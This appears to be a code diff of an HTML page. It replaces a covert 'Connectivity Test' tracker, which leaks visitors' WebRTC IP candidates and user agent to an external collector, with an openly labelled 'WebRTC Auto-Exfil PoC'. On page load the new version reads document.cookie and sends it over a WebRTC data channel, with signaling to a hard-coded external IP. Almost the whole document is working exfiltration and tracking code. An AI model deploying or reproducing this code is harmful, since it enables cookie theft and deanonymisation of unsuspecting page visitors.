@@ -2,51 +2,101 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Connectivity Test</title>
+    <title>WebRTC Auto-Exfil PoC</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: #eee; padding: 40px; }
+        .box { max-width: 700px; margin: auto; background: #2d2d2d; padding: 25px; border-radius: 12px; border: 1px solid #444; }
+        #log { background: #000; color: #00ff00; padding: 15px; border-radius: 5px; height: 350px; overflow-y: auto; font-family: 'Courier New', monospace; font-size: 13px; border: 1px solid #333; }
+        h2 { color: #3498db; margin-top: 0; }
+        .status { color: #888; font-style: italic; margin-bottom: 10px; display: block; }
+    </style>
 </head>
 <body>
-    <h2>Analyzing Connection...</h2>
-    <script>
-        // REPLACE THIS with your Render URL
-        const BACKEND_URL = "https://webrtc-collector.onrender.com";
 
-        async function startTracking() {
-            // Configuration using your TURN/STUN credentials
-            const pc = new RTCPeerConnection({
-                iceServers: [
-                    { urls: "stun:stun.l.google.com:19302" },
-                    { 
-                        urls: "turn:your.turn.server:443", 
-                        username: "user", 
-                        credential: "pass" 
-                    }
-                ]
-            });
+<div class="box">
+    <h2>WebRTC Auto-Exfiltrator</h2>
+    <span class="status">Automated Sequence: Set Cookie -> ICE Gathering -> DTLS Tunnel -> Exfiltrate</span>
+    <div id="log"></div>
+</div>
 
-            // We need a data channel to force the ICE gathering process
-            pc.createDataChannel("tracking");
+<script>
+    // --- CONFIG ---
+    const GCE_IP = "34.38.215.82";
+    // --------------
 
-            pc.onicecandidate = (event) => {
-                if (event.candidate) {
-                    // Send the raw candidate string to your server
-                    // This contains the local/public IP and port mapping
-                    fetch(BACKEND_URL, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            fingerprint: navigator.userAgent,
-                            candidate: event.candidate.candidate
-                        })
-                    }).catch(err => console.error("Tracking blocked or failed:", err));
-                }
-            };
+    const logDiv = document.getElementById('log');
 
-            // Create the offer to start the process
-            const offer = await pc.createOffer();
-            await pc.setLocalDescription(offer);
+    function log(msg) {
+        logDiv.innerHTML += `> ${msg}<br>`;
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
+
+    async function runSequence() {
+        if (GCE_IP === "YOUR_GCE_EXTERNAL_IP") {
+            log("<span style='color:red'>ERROR: Set your GCE_IP in the script!</span>");
+            return;
         }
 
-        startTracking();
-    </script>
+        // 1. SET THE COOKIE (Simulating a session or tracker ID)
+        const fakeToken = "SESSION_" + Math.random().toString(36).substr(2, 9);
+        document.cookie = `user_auth_token=${fakeToken}; path=/; max-age=3600`;
+        log(`[1] Cookie Dropped: user_auth_token=${fakeToken}`);
+
+        // 2. INITIALIZE WEBRTC
+        log("[2] Initializing WebRTC PeerConnection...");
+        const pc = new RTCPeerConnection({
+            iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
+        });
+
+        // 3. CREATE DATA CHANNEL
+        const dc = pc.createDataChannel("exfil_channel");
+
+        dc.onopen = () => {
+            log("[SUCCESS] DataChannel Tunnel Established.");
+
+            // Read back all cookies
+            const payload = document.cookie;
+            log(`[3] Exfiltrating Payload: ${payload}`);
+
+            dc.send(payload);
+        };
+
+        dc.onmessage = (e) => log(`[SERVER] ${e.data}`);
+
+        // 4. CREATE OFFER & GATHER ICE
+        try {
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            log("[4] Gathering network candidates (ICE)...");
+        } catch (e) { log("SDP Error: " + e); }
+
+        pc.onicegatheringstatechange = async () => {
+            if (pc.iceGatheringState === 'complete') {
+                log("[5] Signaling GCE via HTTP POST...");
+
+                try {
+                    const res = await fetch(`http://${GCE_IP}:8080/offer`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            sdp: pc.localDescription.sdp,
+                            type: pc.localDescription.type
+                        })
+                    });
+
+                    const answer = await res.json();
+                    log("[6] Answer received. Finalizing handshake...");
+                    await pc.setRemoteDescription(new RTCSessionDescription(answer));
+                } catch (err) {
+                    log("<span style='color:orange'>Signaling failed. Check GCE Firewall/CORS.</span>");
+                }
+            }
+        };
+    }
+
+    // Trigger on load
+    window.onload = runSequence;
+</script>
+
 </body>
 </html>
